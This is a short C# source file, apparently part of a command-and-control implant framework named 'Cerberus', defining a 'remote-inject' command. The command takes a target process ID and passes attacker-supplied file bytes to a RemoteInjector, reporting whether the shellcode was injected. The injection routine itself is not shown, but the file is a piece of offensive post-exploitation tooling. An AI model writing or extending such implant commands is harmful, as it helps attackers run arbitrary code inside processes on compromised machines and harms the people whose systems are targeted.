using Cerberus.Internal;
using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class RemoteInject : CerberusCommand
    {
        public override string Name => "remote-inject";

        public override string Execute(CerberusTask task)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
                return "Failed to parse PID";

            var injector = new RemoteInjector();
            var success = injector.Inject(task.FileBytes, pid);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
